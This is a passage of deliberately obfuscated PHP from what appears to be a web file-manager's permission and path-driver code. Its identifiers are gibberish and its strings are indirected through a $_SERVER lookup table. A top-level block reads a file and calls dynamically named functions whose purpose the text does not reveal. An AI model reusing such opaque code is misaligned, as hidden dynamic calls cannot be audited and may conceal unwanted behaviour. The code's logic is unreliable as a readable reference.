{ $óöíô•ó = $³ùõç£‰; } } return $óöíô•ó; } private function userIsRoot($ó˜Ô’û = false) { $¾æ›—÷ã =& $_SERVER[Ş­ğŠìÒ]; if (!$ó˜Ô’û && KodUser::isRoot()) { return !0; } $¬ß¶§ä‹ = Model($¾æ›—÷ã[598])->getInfo($ó˜Ô’û); $şÉş„ş = Model($¾æ›—÷ã[2169])->listData($¬ß¶§ä‹[$¾æ›—÷ã[2170]]); if ($şÉş„ş && $şÉş„ş[$¾æ›—÷ã[575]][$¾æ›—÷ã[2171]] == 1) { return !0; } return !1; } private function sourceAuthInfo($–ÂÅö“ã) { $ÉÂí§œ” =& $_SERVER[Ş­ğŠìÒ]; $“‰Æº = Model($ÉÂí§œ”[1414]); $ØËîí = $“‰Æº->sourceInfo($–ÂÅö“ã); if (!$ØËîí) { return !1; } $“‰Æº->groupPathDisplay($ØËîí); $ÎÌâÆÇ = array($ØËîí); $ÎÌâÆÇ = $“‰Æº->_listAppendPath($ÎÌâÆÇ); $ØËîí = $ÎÌâÆÇ[0]; $²™¿é¡ = $ØËîí[$ÉÂí§œ”[582]]; if (isset($ØËîí[$ÉÂí§œ”[590]])) { $öúÔÇ©ğ = explode($ÉÂí§œ”[8], trim($ØËîí[$ÉÂí§œ”[582]], $ÉÂí§œ”[8])); array_shift($öúÔÇ©ğ); $²™¿é¡ = $ØËîí[$ÉÂí§œ”[588]] . $ÉÂí§œ”[2172] . implode($ÉÂí§œ”[8], $öúÔÇ©ğ); } return array($ÉÂí§œ”[494] => $ØËîí[$ÉÂí§œ”[32]], $ÉÂí§œ”[87] => KodIO::make($ØËîí[$ÉÂí§œ”[193]]), $ÉÂí§œ”[2173] => $²™¿é¡); } private function groupAuthInfo($û‘ÉîŒÀ, $ŠÖãÔ¿ì) { $ù¦Ùş =& $_SERVER[Ş­ğŠìÒ]; $¦ŒçÅ±’ = Model($ù¦Ùş[585])->getInfo($ŠÖãÔ¿ì); return array($ù¦Ùş[2174] => intval($û‘ÉîŒÀ[$ù¦Ùş[487]]), $ù¦Ùş[2157] => $û‘ÉîŒÀ, $ù¦Ùş[2175] => LNG($ù¦Ùş[2176]), $ù¦Ùş[2166] => array($ù¦Ùş[494] => $¦ŒçÅ±’[$ù¦Ùş[32]], $ù¦Ùş[87] => KodIO::make($¦ŒçÅ±’[$ù¦Ùş[90]][$ù¦Ùş[193]]), $ù¦Ùş[2173] => $¦ŒçÅ±’[$ù¦Ùş[589]])); } protected function groupRootAuth($¤¥øŒóè, $í°ğÑ¿½ = false) { $è¬ë–‰» =& $_SERVER[Ş­ğŠìÒ]; $í°ğÑ¿½ = $í°ğÑ¿½ ? $í°ğÑ¿½ : USER_ID; $°ƒç¸° = $í°ğÑ¿½ . $è¬ë–‰»[2177] . $¤¥øŒóè; static $„Å¿§‚ = array(); if (isset($„Å¿§‚[$°ƒç¸°])) { return $„Å¿§‚[$°ƒç¸°]; } $øØÄı‹µ = Model($è¬ë–‰»[585])->getInfo($¤¥øŒóè); $»êé = $this->userGroupList($í°ğÑ¿½); $›ºıœÙ = isset($»êé[$¤¥øŒóè]) ? $»êé[$¤¥øŒóè][$è¬ë–‰»[487]] : !1; if ($›ºıœÙ && Model($è¬ë–‰»[571])->authCheckAction($›ºıœÙ[$è¬ë–‰»[487]], $è¬ë–‰»[1984])) { $„Å¿§‚[$°ƒç¸°] = $›ºıœÙ; return $›ºıœÙ; } $æÔŸ×õ¹ = $this->sourceAuthSelect($øØÄı‹µ[$è¬ë–‰»[90]][$è¬ë–‰»[193]]); $ä¾†ª½ú = $æÔŸ×õ¹ ? $this->authMake($æÔŸ×õ¹, $í°ğÑ¿½) : !1; $ûƒ·½™ = $ä¾†ª½ú ? $ä¾†ª½ú[$è¬ë–‰»[540]] : !1; $„Å¿§‚[$°ƒç¸°] = $ûƒ·½™ ? $ûƒ·½™ : $›ºıœÙ; return $„Å¿§‚[$°ƒç¸°]; } public function authOwnerApply($—“¸Ì˜ò) { $ş³ÒŠÓ =& $_SERVER[Ş­ğŠìÒ]; if (empty($—“¸Ì˜ò[$ş³ÒŠÓ[487]]) || isset($—“¸Ì˜ò[$ş³ÒŠÓ[2178]]) && $—“¸Ì˜ò[$ş³ÒŠÓ[2178]]) { return $—“¸Ì˜ò; } if (AuthModel::authCheckRoot($—“¸Ì˜ò[$ş³ÒŠÓ[487]][$ş³ÒŠÓ[488]])) { return $—“¸Ì˜ò; } $®ñ¿ÓßÈ = Model($ş³ÒŠÓ[1414])->parentLevelArray($—“¸Ì˜ò[$ş³ÒŠÓ[584]]); $®ñ¿ÓßÈ = array_merge(array($—“¸Ì˜ò[$ş³ÒŠÓ[193]]), array_reverse($®ñ¿ÓßÈ)); $óŞï¦êŸ = $this->sourceAuthSelect($®ñ¿ÓßÈ); $¸ã˜ÅÎ = array(); $›ÂÕ‚ÚÇ = array(); foreach ($óŞï¦êŸ as $°Ú¨•éÏ => $ºŞÀ‹÷£) { $éŠèş¬á = $this->authFolderOwnerUser($ºŞÀ‹÷£); $¸ã˜ÅÎ[$°Ú¨•éÏ] = $éŠèş¬á; $›ÂÕ‚ÚÇ = array_merge($›ÂÕ‚ÚÇ, $éŠèş¬á[$ş³ÒŠÓ[662]]); if ($éŠèş¬á[$ş³ÒŠÓ[2179]]) { break; } } if (count($›ÂÕ‚ÚÇ) == 0) { $›ÂÕ‚ÚÇ = $this->authFolderOwnerGroup($—“¸Ì˜ò[$ş³ÒŠÓ[569]]); } $›ÂÕ‚ÚÇ = array_unique($›ÂÕ‚ÚÇ); if (AuthModel::authCheckRoot($—“¸Ì˜ò[$ş³ÒŠÓ[487]][$ş³ÒŠÓ[488]])) { $›ÂÕ‚ÚÇ[] = USER_ID; } $—“¸Ì˜ò[$ş³ÒŠÓ[487]][$ş³ÒŠÓ[2180]] = Model($ş³ÒŠÓ[577])->userListInfo($›ÂÕ‚ÚÇ); return $—“¸Ì˜ò; } private function authFolderOwnerGroup($•Œœ½Ä«) { $‹Øûİ¢ =& $_SERVER[Ş­ğŠìÒ]; $‰úûĞíˆ = Model($‹Øûİ¢[2058])->where(array($‹Øûİ¢[1963] => $•Œœ½Ä«))->select(); $ø‹ÅÊŒé = array(); if (!$‰úûĞíˆ) { return $ø‹ÅÊŒé; } foreach ($‰úûĞíˆ as $…âÉÖ¡¢) { $ÑâÛâÌ = $this->authInfo($…âÉÖ¡¢); if (AuthModel::authCheckRoot($ÑâÛâÌ[$‹Øûİ¢[487]])) { $ø‹ÅÊŒé[] = $…âÉÖ¡¢[$‹Øûİ¢[1764]]; } } return $ø‹ÅÊŒé; } private function authFolderOwnerUser($û®şæò) { $”ßÁ†…µ =& $_SERVER[Ş­ğŠìÒ]; $ü¾×Ä½î = array(); $²ŞÈšÖø = !1; foreach ($û®şæò as $¨´É¼î) { $ó‘òÌ¥« = $this->authInfo($¨´É¼î); if ($¨´É¼î[$”ßÁ†…µ[569]] == $”ßÁ†…µ[228]) { $²ŞÈšÖø = !0; } if ($¨´É¼î[$”ßÁ†…µ[190]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($ó‘òÌ¥«[$”ßÁ†…µ[487]])) { $ü¾×Ä½î[] = $¨´É¼î[$”ßÁ†…µ[569]]; } } } return array($”ßÁ†…µ[662] => $ü¾×Ä½î, $”ßÁ†…µ[2179] => $²ŞÈšÖø); } public function authMake($°¿œĞŒ, $²ŒĞÆÇõ = false) { $úß¥¡Æ– =& $_SERVER[Ş­ğŠìÒ]; $œ­ì†üŸ = $this->authArrayCheck($°¿œĞŒ, $²ŒĞÆÇõ); if ($œ­ì†üŸ[$úß¥¡Æ–[2181]]) { $œ­ì†üŸ[$úß¥¡Æ–[2181]] = $this->sourceAuthInfo($œ­ì†üŸ[$úß¥¡Æ–[2181]]); } return $œ­ì†üŸ; } public function authArrayCheck($‰Êşµ ë, $óµŸæ–© = false) { $ğªê½İ =& $_SERVER[Ş­ğŠìÒ]; if (!$‰Êşµ ë) { return array($ğªê½İ[488] => 0, $ğªê½İ[540] => !1); } $óµŸæ–© = $óµŸæ–© ? $óµŸæ–© : USER_ID; $¶Õ†§©ú = 0; $Õã¦¸­æ = 0; $“å€¾ü” = 0; $ññ÷ìÚ… = 0; $¾òì¨‹ç = 0; $é•·ŞÕó = 0; $¯¯Í™åÚ = 1000; $†…‘—ôÈ = 0; $ÍŠ¶¾‘˜ = 0; $ìòÒÃ’å = 0; $ùŒ½ÏªÑ = 0; $ú¹Î–× = array($ğªê½İ[193] => 0); foreach ($‰Êşµ ë as $ú¹Î–×) { $ƒÀÌãÔÓ = $this->authInfo($ú¹Î–×); if (!$ƒÀÌãÔÓ) { continue; } $µ›¿ã¦² = $ú¹Î–×[$ğªê½İ[569]]; $”€èñİ— = intval($ƒÀÌãÔÓ[$ğªê½İ[487]]); if ($ú¹Î–×[$ğªê½İ[190]] == SourceModel::TYPE_USER && $µ›¿ã¦² == $óµŸæ–©) { $¶Õ†§©ú = !0; $“å€¾ü” = $ƒÀÌãÔÓ; $Õã¦¸­æ = $”€èñİ—; } else { if ($ú¹Î–×[$ğªê½İ[190]] == SourceModel::TYPE_GROUP && $this->groupContainUser($µ›¿ã¦², $óµŸæ–©)) { $ññ÷ìÚ… = !0; $£´•­İù = $this->groupStepToUserGroup($µ›¿ã¦², $óµŸæ–©); if ($£´•­İù < $¯¯Í™åÚ) { $¯¯Í™åÚ = $£´•­İù; $¾òì¨‹ç = $”€èñİ—; $é•·ŞÕó = $ƒÀÌãÔÓ; $†…‘—ôÈ = $µ›¿ã¦²; } if ($£´•­İù == $¯¯Í™åÚ && $”€èñİ— >= $¾òì¨‹ç) { $¾òì¨‹ç = $”€èñİ—; $é•·ŞÕó = $ƒÀÌãÔÓ; $†…‘—ôÈ = $µ›¿ã¦²; } } else { if ($µ›¿ã¦² == $ğªê½İ[228]) { $ÍŠ¶¾‘˜ = !0; $ùŒ½ÏªÑ = $ƒÀÌãÔÓ; $ìòÒÃ’å = $”€èñİ—; } } } } if ($¶Õ†§©ú) { $ç­½’¹… = $Õã¦¸­æ; $ƒÀÌãÔÓ = $“å€¾ü”; $µñòÀĞ = LNG($ğªê½İ[2182]); } else { if ($ññ÷ìÚ…) { $ç­½’¹… = $¾òì¨‹ç; $ƒÀÌãÔÓ = $é•·ŞÕó; $šÏ¶âª = Model($ğªê½İ[585])->getInfo($†…‘—ôÈ); $µñòÀĞ = $ğªê½İ[176] . $šÏ¶âª[$ğªê½İ[589]] . $ğªê½İ[2183] . LNG($ğªê½İ[2184]); } else { if ($ÍŠ¶¾‘˜) { $ç­½’¹… = $ìòÒÃ’å; $ƒÀÌãÔÓ = $ùŒ½ÏªÑ; $µñòÀĞ = LNG($ğªê½İ[2154]); } else { $ç­½’¹… = 0; $ƒÀÌãÔÓ = !1; $µñòÀĞ = $ğªê½İ[12]; } } } $Î£şÈã = array($ğªê½İ[2174] => intval($ç­½’¹…), $ğªê½İ[2157] => $ƒÀÌãÔÓ, $ğªê½İ[2175] => $µñòÀĞ, $ğªê½İ[2166] => $ú¹Î–×[$ğªê½İ[193]]); return $Î£şÈã; } private function groupContainUser($Åäˆ…¾Š, $Çß„İ¡© = false) { return in_array($Åäˆ…¾Š, $this->userGroupParents($Çß„İ¡©)); } private function groupStepToUserGroup($Õ¼¡èæ, $Í¯Ÿç„á = false) { $Ê£ûüô =& $_SERVER[Ş­ğŠìÒ]; $ùÂÂ• = $this->userGroupList($Í¯Ÿç„á); $î´œ®¤ = 1000; $öôúÜ»„ = $GLOBALS[$Ê£ûüô[6]][$Ê£ûüô[92]][$Ê£ûüô[2071]] == 1; $¼ÌÉâ‚¡ = $öôúÜ»„ ? 3 : 2; foreach ($ùÂÂ• as $Û…ùçêÅ) { if ($Û…ùçêÅ[$Ê£ûüô[1963]] == $Õ¼¡èæ) { return 0; } $Š÷ÔäĞì = explode($Ê£ûüô[50], trim($Û…ùçêÅ[$Ê£ûüô[584]], $Ê£ûüô[50])); if ($Š÷ÔäĞì[0] == $Ê£ûüô[228] && count($Š÷ÔäĞì) > $¼ÌÉâ‚¡) { $¨­ÓÚğ¦ = array_reverse(array_slice($Š÷ÔäĞì, $¼ÌÉâ‚¡)); $ÑÄŒû£Ü = array_search($Õ¼¡èæ, $¨­ÓÚğ¦); if ($ÑÄŒû£Ü !== !1 && $ÑÄŒû£Ü + 1 <= $î´œ®¤) { $î´œ®¤ = $ÑÄŒû£Ü + 1; } } } return $î´œ®¤; } private function userGroupList($Ë¯ˆ´·Ä = false) { $ßĞÌ˜ç =& $_SERVER[Ş­ğŠìÒ]; static $Æ§Ñ§†– = array(); if (isset($Æ§Ñ§†–[$Ë¯ˆ´·Ä])) { return $Æ§Ñ§†–[$Ë¯ˆ´·Ä]; } $•ºë‘Óˆ = Model($ßĞÌ˜ç[598])->getInfo($Ë¯ˆ´·Ä); $Æ§Ñ§†–[$Ë¯ˆ´·Ä] = array_to_keyvalue($•ºë‘Óˆ[$ßĞÌ˜ç[2155]], $ßĞÌ˜ç[1963]); return $Æ§Ñ§†–[$Ë¯ˆ´·Ä]; } public function userGroupParents($ç¼æ¿‚ë) { $±‘Ô’£ =& $_SERVER[Ş­ğŠìÒ]; static $å†¥ï‡ = array(); $ç¼æ¿‚ë = $ç¼æ¿‚ë ? $ç¼æ¿‚ë : USER_ID; if (isset($å†¥ï‡[$ç¼æ¿‚ë])) { return $å†¥ï‡[$ç¼æ¿‚ë]; } $÷ªÀŒõ‘ = $this->userGroupList($ç¼æ¿‚ë); $••ùÓ”” = array(); $ë­ìÉôÂ = $GLOBALS[$±‘Ô’£[6]][$±‘Ô’£[92]][$±‘Ô’£[2071]] == 1; $´…Øïª = $ë­ìÉôÂ ? 3 : 2; foreach ($÷ªÀŒõ‘ as $×’Á‡§Ö) { $‘Ó«óó = array($×’Á‡§Ö[$±‘Ô’£[1963]]); $­¢š„”ø = explode($±‘Ô’£[50], trim($×’Á‡§Ö[$±‘Ô’£[584]], $±‘Ô’£[50])); if ($­¢š„”ø[0] == $±‘Ô’£[228] && count($­¢š„”ø) > $´…Øïª) { $î—‚ú·¾ = array_slice($­¢š„”ø, $´…Øïª); $‘Ó«óó = array_merge($‘Ó«óó, array_reverse($î—‚ú·¾)); } $••ùÓ”” = array_merge($••ùÓ””, $‘Ó«óó); } $å†¥ï‡[$ç¼æ¿‚ë] = array_unique($••ùÓ””); return $å†¥ï‡[$ç¼æ¿‚ë]; } public function authTargetInfoMake($Óôº¸ì) { $“¸¤ó©” =& $_SERVER[Ş­ğŠìÒ]; $—Š…ìîÎ = array(); $ûÅ¯ñ¥‘ = array(); foreach ($Óôº¸ì as $ç®ñ­ Æ) { if ($ç®ñ­ Æ[$“¸¤ó©”[190]] == SourceModel::TYPE_USER) { $—Š…ìîÎ[] = intval($ç®ñ­ Æ[$“¸¤ó©”[569]]); } else { if ($ç®ñ­ Æ[$“¸¤ó©”[190]] == SourceModel::TYPE_GROUP) { $ûÅ¯ñ¥‘[] = intval($ç®ñ­ Æ[$“¸¤ó©”[569]]); } } } if ($—Š…ìîÎ) { $—Š…ìîÎ = Model($“¸¤ó©”[577])->userListInfo($—Š…ìîÎ); } if ($ûÅ¯ñ¥‘) { $§¡—ƒ¾û = array($“¸¤ó©”[2056] => array($“¸¤ó©”[492], $ûÅ¯ñ¥‘)); $ûÅ¯ñ¥‘ = Model($“¸¤ó©”[585])->field($“¸¤ó©”[2185])->where($§¡—ƒ¾û)->select(); $ûÅ¯ñ¥‘ = array_to_keyvalue($ûÅ¯ñ¥‘, $“¸¤ó©”[1963]); } return array($“¸¤ó©”[2186] => $—Š…ìîÎ, $“¸¤ó©”[2187] => $ûÅ¯ñ¥‘); } public function authInfo($¥Ì½ò¦Œ) { $õêäÓÄ =& $_SERVER[Ş­ğŠìÒ]; if ($¥Ì½ò¦Œ[$õêäÓÄ[2072]]) { $°ÎÀÈÅÇ = Model($õêäÓÄ[571])->listData($¥Ì½ò¦Œ[$õêäÓÄ[2072]]); if (!$°ÎÀÈÅÇ) { return !1; $ğ‚óÎ¬ë = Model($õêäÓÄ[571])->listData(); $†şòáœ = array_filter_by_field($ğ‚óÎ¬ë, $õêäÓÄ[487], $õêäÓÄ[228]); return $†şòáœ; } $œÅõ–†Ô = array_field_key($°ÎÀÈÅÇ, array($õêäÓÄ[475], $õêäÓÄ[32], $õêäÓÄ[487], $õêäÓÄ[1986], $õêäÓÄ[1987])); $œÅõ–†Ô[$õêäÓÄ[2188]] = $¥Ì½ò¦Œ; return $œÅõ–†Ô; } else { return array($õêäÓÄ[493] => 0, $õêäÓÄ[1969] => $¥Ì½ò¦Œ[$õêäÓÄ[2132]], $õêäÓÄ[494] => $õêäÓÄ[12], $õêäÓÄ[1986] => $õêäÓÄ[2189]); } } } if ($_SERVER[$_SERVER[Ş­ğŠìÒ][945]] != $_SERVER[$_SERVER[Ş­ğŠìÒ][1988]]) { $_getc = $_SERVER[Ş­ğŠìÒ][947]; $_getfile = $_SERVER[$_SERVER[Ş­ğŠìÒ][948]] . $_SERVER[Ş­ğŠìÒ][949]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[Ş­ğŠìÒ][262], $_getfilec); if (count($_getarrs) < $_SERVER[Ş­ğŠìÒ][683]) { $exit = $_SERVER[Ş­ğŠìÒ][950]; $exit(); } $_act = $_SERVER[Ş­ğŠìÒ][958]; $_act($_SERVER[$_SERVER[Ş­ğŠìÒ][943]]); } goto d‹†Ÿˆª×Ş; b­§İº: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $©»¥©ç› =& $_SERVER[Ş­ğŠìÒ]; $this->objectDriver = array($©»¥©ç›[60], $©»¥©ç›[61], $©»¥©ç›[62], $©»¥©ç›[63], $©»¥©ç›[64], $©»¥©ç›[65], $©»¥©ç›[66], $©»¥©ç›[67], $©»¥©ç›[68], $©»¥©ç›[69], $©»¥©ç›[70], $©»¥©ç›[71]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($ÉìÕ…éÁ) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($ÉìÕ…éÁ, $_SERVER[Ş­ğŠìÒ][8]); } return $ÉìÕ…éÁ; } public function iconvApp($ëÑşá–) { return $ëÑşá–; } public function iconvSystem($Ğ›ØÖŞ) { return $Ğ›ØÖŞ; } public function iconvTo($¢ã¾û¹±, $ëØ“Î‹¾, $ÇëÅ¢¦²) { $Ò¶–†ë =& $_SERVER[Ş­ğŠìÒ]; if (!$¢ã¾û¹± || !function_exists($Ò¶–†ë[72])) { return $¢ã¾û¹±; } static $¾¨ıÈ = array(); $æÑ¡• = $ëØ“Î‹¾ . $Ò¶–†ë[73] . $ÇëÅ¢¦² . $Ò¶–†ë[74] . $¢ã¾û¹±; if (isset($¾¨ıÈ[$æÑ¡•])) { return $¾¨ıÈ[$æÑ¡•]; } if (function_exists($Ò¶–†ë[75])) { $â¥–Ú¹€ = @mb_convert_encoding($¢ã¾û¹±, $ÇëÅ¢¦², $ëØ“Î‹¾); } else { $â¥–Ú¹€ = @iconv($ëØ“Î‹¾, $ÇëÅ¢¦², $¢ã¾û¹±); } $â¥–Ú¹€ = $â¥–Ú¹€ ? $â¥–Ú¹€ : $¢ã¾û¹±; if (strstr($â¥–Ú¹€, $Ò¶–†ë[76])) { $â¥–Ú¹€ = str_replace($Ò¶–†ë[76], $Ò¶–†ë[11], $â¥–Ú¹€); } $¾¨ıÈ[$ëØ“Î‹¾ . $Ò¶–†ë[73] . $ÇëÅ¢¦² . $Ò¶–†ë[74] . $¢ã¾û¹±] = $â¥–Ú¹€; $¾¨ıÈ[$ÇëÅ¢¦² . $Ò¶–†ë[73] . $ëØ“Î‹¾ . $Ò¶–†ë[74] . $¢ã¾û¹±] = $¢ã¾û¹±; $¾¨ıÈ[$ÇëÅ¢¦² . $Ò¶–†ë[73] . $ëØ“Î‹¾ . $Ò¶–†ë[74] . $â¥–Ú¹€] = $¢ã¾û¹±; $¾¨ıÈ[$ëØ“Î‹¾ . $Ò¶–†ë[73] . $ÇëÅ¢¦² . $Ò¶–†ë[74] . $â¥–Ú¹€] = $â¥–Ú¹€; return $â¥–Ú¹€; } public function getPathInner($Ã•Äî”ú) { $óî»÷çÇ = IO::init($Ã•Äî”ú); return $óî»÷çÇ->path; } public function getPathOuter($Ëéòí¥) { $÷á‘÷†  =& $_SERVER[Ş­ğŠìÒ]; $Ÿ½úº• = strlen(trim($this->pathBase, $÷á‘÷† [8])); $Ëéòí¥ = substr(trim($Ëéòí¥, $÷á‘÷† [8]), $Ÿ½úº•); return $this->pathDriver . $÷á‘÷† [8] . ltrim($Ëéòí¥, $÷á‘÷† [8]); } public function isParentOf($³ê¡âÊô, $ë—İÕÜ“) { $’®Ì¬Æ· =& $_SERVER[Ş­ğŠìÒ]; $³ê¡âÊô = rtrim(strtolower($³ê¡âÊô), $’®Ì¬Æ·[8]) . $’®Ì¬Æ·[8]; $ë—İÕÜ“ = rtrim(strtolower($ë—İÕÜ“), $’®Ì¬Æ·[8]) . $’®Ì¬Æ·[8]; $Çü»‰ô» = strpos($ë—İÕÜ“, $³ê¡âÊô) === 0; return $Çü»‰ô»; } public function getType() { $±÷‹³“‘ =& $_SERVER[Ş­ğŠìÒ]; $Áç‘¶½ = str_replace($±÷‹³“‘[77], $±÷‹³“‘[12], get_class($this)); return strtolower($Áç‘¶½); } public function isOsDriver() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($˜ˆ•ÏšÃ, $Ã¶äÊ¬‘) { $¡¤´æÛ÷ =& $_SERVER[Ş­ğŠìÒ]; $êŞ“­ø = rtrim($˜ˆ•ÏšÃ, $¡¤´æÛ÷[8]) . $¡¤´æÛ÷[8] . $Ã¶äÊ¬‘; $–‘ËºÓ± = $this->exist($êŞ“­ø); return $–‘ËºÓ± ? $êŞ“­ø : !1; } public function setModifyTime($«­‚Ëà, $ÕÑŠ¦Ô = '') { } public function renameObject($¿ü´İÕ, $¡¾”ıõ”) { $–‰ÌØ¾Û = $¡¾”ıõ”; $¿ü´İÕ = $this->getPathOuter($¿ü´İÕ); $¡¾”ıõ” = $this->pathFather($¿ü´İÕ) . $¡¾”ıõ”; $äÀ±²« = IO::copy($¿ü´İÕ, $this->pathFather($¿ü´İÕ), REPEAT_RENAME_FOLDER, $–‰ÌØ¾Û); if ($äÀ±²«) { IO::remove($¿ü´İÕ); } return $äÀ±²« ? $¡¾”ıõ” : !1; } public function tempFile($¾Çì¡´Ü = '', $í³îìß» = '') { if (!$¾Çì¡´Ü) { $¾Çì¡´Ü = rand_string(15); } $ãñ¢‹á = TEMP_FILES . rand_string(15) . $_SERVER[Ş­ğŠìÒ][8]; @mkdir($ãñ¢‹á, DEFAULT_PERRMISSIONS, !0); $“ä£–ö = $ãñ¢‹á . $¾Çì¡´Ü; @touch($“ä£–ö); if ($í³îìß») { file_put_contents($“ä£–ö, $í³îìß»); } return $“ä£–ö; } public function tempFileRemve($ö°€¯Œ) { @unlink($ö°€¯Œ); @rmdir($this->pathFather($ö°€¯Œ)); } public function mkfile($š˜Òõüü, $¥ĞŸ­œø = '', $»’‘ªğ€ = REPEAT_RENAME) { } public function mkdir($¤¢ŸôÉ‰, $ìë´š« = REPEAT_SKIP) { } public function delFile($úÖæ£½) { } public function delFolder($ ê¥­Ä) { } public function copyFile($¦¡Ç”ÙÕ, $äîˆÍÎ†) { } public function moveFile($ã€¡ÓïÆ, $Ş¦â½ç“) { } public function remove($ï‹ê ÍÀ) { if ($this->isFile($ï‹ê ÍÀ)) { return $this->delFile($ï‹ê ÍÀ); } return $this->delFolder($ï‹ê ÍÀ); } public function rename($õèÔÖ¶Ø, $†ÚÖ¦Ñ) { } public function exist($ÅÃŠæ§) { } public function findByHash($ÍÚ”¬ = '', $ÑôË²¶ = '') { return !1; } public function isFile($µØŠ‰¹ğ) { } public function isFolder($ô¨”Œ‹ü) { } public function size($Çå‰äğ) { } public function info($êèÔ‡ÍÕ) { } public function infoSimple($Î¸ÆŒ—ã) { return $this->info($Î¸ÆŒ—ã); } public function infoAuth($ß–†ˆù¨) { return $this->info($ß–†ˆù¨); } public function infoFull($½€¤‚®) { return $this->info($½€¤‚®); } public function infoFullSimple($ºû”«’Ñ) { return $this->info($ºû”«’Ñ); } public function infoWithChildren($•Ô€´ñ¦) { $è¡Ñ±ù¨ =& $_SERVER[Ş­ğŠìÒ]; static $²ƒòïôñ = array(); if (isset($²ƒòïôñ[$•Ô€´ñ¦])) { return $²ƒòïôñ[$•Ô€´ñ¦]; } $€£Ğ™ô = $this->info($•Ô€´ñ¦); if ($€£Ğ™ô && $€£Ğ™ô[$è¡Ñ±ù¨[33]] == $è¡Ñ±ù¨[78]) { $§÷ô¶·ã = array($è¡Ñ±ù¨[79] => 0, $è¡Ñ±ù¨[80] => 0, $è¡Ñ±ù¨[81] => 0); $this->infoChildren($•Ô€´ñ¦, $§÷ô¶·ã); $€£Ğ™ô[$è¡Ñ±ù¨[79]] = $§÷ô¶·ã[$è¡Ñ±ù¨[79]]; $€£Ğ™ô[$è¡Ñ±ù¨[82]] = array($è¡Ñ±ù¨[83] => $§÷ô¶·ã[$è¡Ñ±ù¨[80]], $è¡Ñ±ù¨[84] => $§÷ô¶·ã[$è¡Ñ±ù¨[81]]); $²ƒòïôñ[$•Ô€´ñ¦] = $€£Ğ™ô; } return $€£Ğ™ô; } public function listPath($şºã‹Û¬, $ñ‰ÉšÇ˜ = false) { } public function has($›ÕÑŠ’Ö, $Şó°€¼¹ = false, $¶ìÛãÊ = false) { } public function canRead($›ÌˆÇÎ±) { } public function canWrite($¯øÕ«ıç) { } public function getContent($âÀìòÇ) { } public function setContent($úıîØä¶, $¡µ¾‹œ = '') { } protected function infoChildren($Ê‰·óÃÑ, &$×ùèàÌ) { $ƒƒƒœôÁ =& $_SERVER[Ş­ğŠìÒ]; check_abort_echo(); $˜®î§± = $this->listPath($Ê‰·óÃÑ, !0); $˜®î§± = array_merge($˜®î§±[$ƒƒƒœôÁ[85]], $˜®î§±[$ƒƒƒœôÁ[86]]); foreach ($˜®î§± as $ë´Íè¼È) { if ($ë´Íè¼È[$ƒƒƒœôÁ[33]] == $ƒƒƒœôÁ[78]) { $×ùèàÌ[$ƒƒƒœôÁ[81]]++; $¥°“¹µ‹ = $this->getPathInner($ë´Íè¼È[$ƒƒƒœôÁ[87]]); $this->infoChildren($¥°“¹µ‹, $×ùèàÌ); } else { $×ùèàÌ[$ƒƒƒœôÁ[80]]++; $×ùèàÌ[$ƒƒƒœôÁ[79]] += $ë´Íè¼È[$ƒƒƒœôÁ[79]]; } } } public function fileSubstr($ßÄÚ€ç¹, $Â°×¨‘, $úá‹ä¸Ú) { } public function listAll($İ·¯¿ÃÆ) { } public function listAllMake($¥Ëáê–Ê, &$‰îÂş“İ) { $ËÈĞ¡®° =& $_SERVER[Ş­ğŠìÒ]; check_abort_echo(); $¾Ñï«öÏ = $this->listPath($¥Ëáê–Ê, !0); if (!$¾Ñï«öÏ) { return; } $É‰ÒšİÂ = array_merge($¾Ñï«öÏ[$ËÈĞ¡®°[85]], $¾Ñï«öÏ[$ËÈĞ¡®°[86]]); foreach ($É‰ÒšİÂ as $œá “Ì¤) { $÷ûÖÌô­ = $œá “Ì¤[$ËÈĞ¡®°[33]] == $ËÈĞ¡®°[78]; $ƒµÊíô· = array($ËÈĞ¡®°[87] => $œá “Ì¤[$ËÈĞ¡®°[87]], $ËÈĞ¡®°[78] => $÷ûÖÌô­); if (isset($œá “Ì¤[$ËÈĞ¡®°[79]])) { $ƒµÊíô·[$ËÈĞ¡®°[79]] = $œá “Ì¤[$ËÈĞ¡®°[79]]; } if (isset($œá “Ì¤[$ËÈĞ¡®°[88]])) { $ƒµÊíô·[$ËÈĞ¡®°[88]] = $œá “Ì¤[$ËÈĞ¡®°[88]]; } if (!$÷ûÖÌô­) { $‰îÂş“İ[] = $ƒµÊíô·; continue; } $‰îÂş“İ[] = $ƒµÊíô·; $ô›¦“œî = $œá “Ì¤[$ËÈĞ¡®°[87]]; $ùú€“¾ô = $this->pathDriver; if (substr($œá “Ì¤[$ËÈĞ¡®°[87]], 0, strlen($ùú€“¾ô)) == $ùú€“¾ô) { $ô›¦“œî = substr($ô›¦“œî, strlen($ùú€“¾ô)); } $this->listAllMake($ô›¦“œî, $‰îÂş“İ); } } public function listAllSimple($ü‚™ê“®, $™õŸÕ—¿ = false) { $Ã™‹äØ« = $this->listAll($ü‚™ê“®); return $this->listAllSimpleMake($Ã™‹äØ«, $this->getPathOuter($ü‚™ê“®), $™õŸÕ—¿); } public function listAllSimpleMake($Ñ½½§, $Õ„‘‹«¿, $ÄÈœÙ‹) { $’Û×ÒÍñ =& $_SERVER[Ş­ğŠìÒ]; $¡Ù¯—•† = array(); $Õ„‘‹«¿ = rtrim(get_path_father($Õ„‘‹«¿), $’Û×ÒÍñ[8]) . $’Û×ÒÍñ[8]; foreach ($Ñ½½§ as $ë§œ¸ç) { $ºÓóü¬¡ = array($’Û×ÒÍñ[87] => $ë§œ¸ç[$’Û×ÒÍñ[87]], $’Û×ÒÍñ[89] => $ë§œ¸ç[$’Û×ÒÍñ[87]], $’Û×ÒÍñ[78] => $ë§œ¸ç[$’Û×ÒÍñ[78]]); if (isset($ë§œ¸ç[$’Û×ÒÍñ[79]]) && !$ë§œ¸ç[$’Û×ÒÍñ[78]]) { $ºÓóü¬¡[$’Û×ÒÍñ[79]] = $ë§œ¸ç[$’Û×ÒÍñ[79]]; } if (isset($ë§œ¸ç[$’Û×ÒÍñ[88]])) { $ºÓóü¬¡[$’Û×ÒÍñ[88]] = $ë§œ¸ç[$’Û×ÒÍñ[88]]; } if 